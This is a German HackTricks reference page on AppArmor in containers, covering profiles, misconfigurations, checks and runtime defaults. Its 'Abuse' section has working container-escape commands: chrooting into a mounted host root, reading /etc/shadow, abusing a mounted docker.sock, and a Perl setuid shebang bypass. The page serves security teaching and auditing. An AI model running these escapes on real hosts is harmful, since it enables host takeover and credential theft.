# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Übersicht

AppArmor ist eine verpflichtende Zugriffskontrolle (Mandatory Access Control), die Einschränkungen über programmbezogene Profile anwendet. Im Gegensatz zu traditionellen DAC-Prüfungen, die stark von Benutzer- und Gruppenbesitz abhängen, erlaubt AppArmor dem Kernel, eine an den Prozess selbst gebundene Richtlinie durchzusetzen. In Container-Umgebungen ist das wichtig, weil ein Workload möglicherweise über genügend traditionelle Rechte verfügt, um eine Aktion zu versuchen, aber trotzdem verweigert wird, weil sein AppArmor-Profil den entsprechenden Pfad, Mount, Netzwerkverhalten oder die Nutzung von Capabilities nicht erlaubt.

Der wichtigste konzeptionelle Punkt ist, dass AppArmor pfadbasiert ist. Es bewertet den Zugriff auf das Dateisystem anhand von Pfadregeln statt über Labels, wie es SELinux tut. Das macht es zugänglich und mächtig, bedeutet aber auch, dass bind mounts und alternative Pfadlayouts besondere Aufmerksamkeit verdienen. Wenn dieselben Host-Inhalte unter einem anderen Pfad erreichbar werden, kann die Wirkung der Richtlinie anders sein als vom Operator zunächst erwartet.

## Rolle in der Container-Isolierung

Container-Sicherheitsprüfungen enden oft bei Capabilities und seccomp, aber AppArmor bleibt auch nach diesen Checks relevant. Stellen Sie sich einen Container vor, der mehr Privilegien hat, als er sollte, oder einen Workload, der aus betrieblichen Gründen eine zusätzliche Capability benötigte. AppArmor kann dennoch Dateizugriffe, Mount-Verhalten, Netzwerkzugriffe und Ausführungsmuster einschränken und so den offensichtlichen Missbrauchspfad verhindern. Deshalb kann das Deaktivieren von AppArmor „nur damit die Anwendung funktioniert“ eine lediglich riskante Konfiguration still und heimlich in eine aktiv ausnutzbare verwandeln.

## Labor

Um zu prüfen, ob AppArmor auf dem Host aktiv ist, verwenden Sie:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Um zu sehen, unter welcher Identität der aktuelle Container-Prozess läuft:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Der Unterschied ist aufschlussreich. Im normalen Fall sollte der Prozess einen AppArmor-Kontext anzeigen, der an das von der Laufzeit gewählte Profil gebunden ist. Im unconfined-Fall verschwindet diese zusätzliche Beschränkungsebene.

Sie können auch prüfen, was Docker für angewendet hält:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Laufzeitnutzung

Docker kann ein Standard- oder benutzerdefiniertes AppArmor-Profil anwenden, wenn der Host dies unterstützt. Podman kann AppArmor auf AppArmor-basierten Systemen ebenfalls integrieren, obwohl auf SELinux-orientierten Distributionen das andere MAC-System oft im Vordergrund steht. Kubernetes kann AppArmor-Policy auf Workload-Ebene auf Nodes bereitstellen, die AppArmor tatsächlich unterstützen. LXC und verwandte system-container-Umgebungen der Ubuntu-Familie verwenden AppArmor ebenfalls extensiv.

Wichtig ist, dass AppArmor kein "Docker feature" ist. Es ist eine Kernel-Funktion des Hosts, die mehrere Laufzeitumgebungen anwenden können. Wenn der Host es nicht unterstützt oder die Laufzeit angewiesen wird, unconfined zu laufen, ist der vermeintliche Schutz praktisch nicht vorhanden.

Auf Docker-fähigen AppArmor-Hosts ist das bekannteste Default-Profil `docker-default`. Dieses Profil wird aus Moby's AppArmor-Template generiert und ist wichtig, weil es erklärt, warum einige capability-basierte PoCs in einem Standard-Container trotzdem fehlschlagen. Grob gesagt erlaubt `docker-default` normales Networking, verweigert Schreibzugriffe auf große Teile von `/proc`, verweigert Zugriff auf sensible Bereiche von `/sys`, blockiert Mount-Operationen und schränkt ptrace so ein, dass es kein allgemeines Host-Probing-Primitiv ist. Das Verstehen dieser Basislinie hilft, "der Container hat `CAP_SYS_ADMIN`" von "der Container kann diese Capability tatsächlich gegen die Kernel-Interfaces nutzen, die mich interessieren" zu unterscheiden.

## Profilverwaltung

AppArmor-Profile werden üblicherweise unter `/etc/apparmor.d/` abgelegt. Übliche Namenskonvention ist, die Schrägstriche im Pfad des ausführbaren Programms durch Punkte zu ersetzen. Zum Beispiel wird ein Profil für `/usr/bin/man` häufig als `/etc/apparmor.d/usr.bin.man` gespeichert. Diese Kleinigkeit ist sowohl bei der Verteidigung als auch bei der Bewertung wichtig, weil man, sobald man den aktiven Profilnamen kennt, die entsprechende Datei auf dem Host oft schnell findet.

Nützliche hostseitige Verwaltungsbefehle sind:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Der Grund, warum diese Befehle in einer container-security-Referenz wichtig sind, ist, dass sie erklären, wie Profile tatsächlich erstellt, geladen, in complain mode geschaltet und nach Änderungen an der Anwendung modifiziert werden. Wenn ein Operator dazu neigt, Profile während der Fehlerbehebung in den complain mode zu versetzen und anschließend vergisst, enforcement wiederherzustellen, kann der Container in der Dokumentation geschützt aussehen, sich in Wirklichkeit jedoch deutlich lockerer verhalten.

### Erstellen und Aktualisieren von Profilen

`aa-genprof` kann das Verhalten der Anwendung beobachten und interaktiv bei der Erstellung eines Profils helfen:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` kann ein Template-Profil erzeugen, das später mit `apparmor_parser` geladen werden kann:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wenn sich die Binärdatei ändert und die Richtlinie aktualisiert werden muss, kann `aa-logprof` Verweigerungen in den Protokollen erneut abspielen und den Betreiber dabei unterstützen, zu entscheiden, ob er diese erlauben oder verweigern soll:
```bash
sudo aa-logprof
```
### Protokolle

AppArmor-Verweigerungen sind häufig über `auditd`, syslog oder Tools wie `aa-notify` sichtbar:
```bash
sudo aa-notify -s 1 -v
```
Das ist sowohl operativ als auch offensiv nützlich. Verteidiger nutzen es, um Profile zu verfeinern. Angreifer nutzen es, um herauszufinden, welcher genaue Pfad oder welche Operation verweigert wird und ob AppArmor die Sicherheitskontrolle ist, die eine Exploit-Kette blockiert.

### Identifizierung der genauen Profildatei

Wenn eine runtime einen bestimmten AppArmor-Profilnamen für einen container anzeigt, ist es oft nützlich, diesen Namen der Profildatei auf dem Datenträger zuzuordnen:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Das ist besonders nützlich bei der hostseitigen Überprüfung, weil es die Lücke zwischen "der Container gibt an, unter dem Profil `lowpriv` zu laufen" und "die tatsächlichen Regeln leben in genau dieser Datei, die auditiert oder neu geladen werden kann" überbrückt.

## Misconfigurations

Der offensichtlichste Fehler ist `apparmor=unconfined`. Administratoren setzen ihn oft beim Debuggen einer Anwendung, die fehlgeschlagen ist, weil das Profil korrekt etwas Gefährliches oder Unerwartetes blockiert hat. Bleibt die Option in der Produktion bestehen, ist die gesamte MAC-Schicht faktisch entfernt.

Ein weiteres, subtileres Problem ist die Annahme, dass bind mounts harmlos seien, weil die Dateiberechtigungen normal aussehen. Da AppArmor pfadbasiert arbeitet, kann das Freilegen von Host-Pfaden unter alternativen Mount-Locations schlecht mit Pfadregeln interagieren. Ein dritter Fehler ist zu vergessen, dass ein Profilname in einer Konfigurationsdatei wenig aussagt, wenn der Host-Kernel AppArmor nicht tatsächlich durchsetzt.

## Abuse

Wenn AppArmor fehlt, können Operationen, die zuvor eingeschränkt waren, plötzlich funktionieren: das Lesen sensibler Pfade über bind mounts, der Zugriff auf Teile von procfs oder sysfs, die eigentlich schwerer zugänglich bleiben sollten, das Ausführen mount-bezogener Aktionen, falls capabilities/seccomp dies ebenfalls erlauben, oder die Nutzung von Pfaden, die ein Profil normalerweise verweigern würde. AppArmor ist oft der Mechanismus, der erklärt, warum ein capability-based breakout attempt auf dem Papier "funktionieren sollte", in der Praxis aber fehlschlägt. Entfernt man AppArmor, kann derselbe Versuch beginnen zu funktionieren.

Wenn Sie vermuten, dass AppArmor das Haupthindernis für eine path-traversal-, bind-mount- oder mount-based abuse chain ist, besteht der erste Schritt meist darin zu vergleichen, was mit und ohne Profil zugänglich wird. Zum Beispiel: Wenn ein Host-Pfad im Container gemountet ist, prüfen Sie zunächst, ob Sie ihn traversieren und lesen können:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Wenn der Container außerdem eine gefährliche Capability wie `CAP_SYS_ADMIN` besitzt, ist einer der praktischsten Tests, ob AppArmor der Mechanismus ist, der Mount-Operationen oder den Zugriff auf sensible Kernel-Dateisysteme blockiert:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
In Umgebungen, in denen ein Host-Pfad bereits über ein bind mount verfügbar ist, kann der Verlust von AppArmor ein nur-lesbares Problem der Informationsoffenlegung in direkten Zugriff auf Host-Dateien verwandeln:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Der Sinn dieser Befehle ist nicht, dass AppArmor allein den breakout verursacht. Vielmehr ist die Aussage, dass viele Dateisystem- und Mount-basierte Missbrauchspfade sofort testbar werden, sobald AppArmor entfernt ist.

### Vollständiges Beispiel: AppArmor deaktiviert + Host-Root gemountet

Wenn der Container bereits das Host-Root bei `/host` per bind mount eingebunden hat, kann das Entfernen von AppArmor einen blockierten Dateisystem-Missbrauchspfad in einen vollständigen host escape verwandeln:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Sobald die shell über das host filesystem ausgeführt wird, hat die workload die container-Grenze effektiv verlassen:
```bash
id
hostname
cat /etc/shadow | head
```
### Vollständiges Beispiel: AppArmor deaktiviert + Runtime-Socket

Wenn die eigentliche Barriere AppArmor zum Schutz des Laufzeitzustands war, kann ein gemounteter Socket für einen vollständigen Escape ausreichen:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Der genaue Pfad hängt vom Mount-Punkt ab, aber das Endergebnis ist dasselbe: AppArmor verhindert nicht mehr den Zugriff auf die runtime API, und die runtime API kann einen den Host kompromittierenden Container starten.

### Vollständiges Beispiel: Path-Based Bind-Mount Bypass

Da AppArmor pfadbasiert ist, schützt das Schützen von `/proc/**` nicht automatisch denselben procfs-Inhalt des Hosts, wenn er über einen anderen Pfad erreichbar ist:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
### Vollständiges Beispiel: Shebang Bypass

AppArmor-Policy zielt manchmal auf einen Interpreter-Pfad ab, ohne die Ausführung von Skripten über die shebang-Verarbeitung vollständig zu berücksichtigen. Ein historisches Beispiel betraf die Verwendung eines Skripts, dessen erste Zeile auf einen eingeschränkten Interpreter zeigt:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Diese Art von Beispiel ist eine wichtige Erinnerung daran, dass die beabsichtigte Wirkung eines Profils und die tatsächliche Ausführungssemantik auseinanderfallen können. Bei der Überprüfung von AppArmor in Container-Umgebungen verdienen Interpreter-Ketten und alternative Ausführungspfade besondere Aufmerksamkeit.

## Checks

Ziel dieser Checks ist es, drei Fragen schnell zu beantworten: Ist AppArmor auf dem Host aktiviert, ist der aktuelle Prozess eingeschränkt, und hat die Runtime tatsächlich ein Profil auf diesen Container angewendet?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Was hier interessant ist:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- Wenn `aa-status` AppArmor als deaktiviert oder nicht geladen anzeigt, ist jeder Profilname in der Runtime-Konfiguration größtenteils kosmetisch.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Standardwerte zur Laufzeit

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Schwächungen |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig auf AppArmor-fähigen Hosts aktiviert | Verwendet das AppArmor-Profil `docker-default`, sofern nicht überschrieben | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Hostabhängig | AppArmor wird über `--security-opt` unterstützt, aber der genaue Default ist host-/runtimeabhängig und weniger universell als Dockers dokumentiertes `docker-default`-Profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Bedingter Standard | Wenn `appArmorProfile.type` nicht angegeben ist, ist der Default `RuntimeDefault`, aber er wird nur angewendet, wenn AppArmor auf dem Node aktiviert ist | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` mit einem schwachen Profil, Nodes ohne AppArmor-Unterstützung |
| containerd / CRI-O unter Kubernetes | Folgt der Node-/Runtime-Unterstützung | Gängige von Kubernetes unterstützte Runtimes unterstützen AppArmor, aber die tatsächliche Durchsetzung hängt weiterhin von der Node-Unterstützung und den Workload-Einstellungen ab | Wie in der Kubernetes-Zeile; direkte Runtime-Konfiguration kann AppArmor ebenfalls vollständig umgehen |

Für AppArmor ist die wichtigste Variable oft der **Host**, nicht nur die Runtime. Eine Profil-Einstellung in einem Manifest erzeugt keine Konfinierung auf einem Node, auf dem AppArmor nicht aktiviert ist.
{{#include ../../../../banners/hacktricks-training.md}}
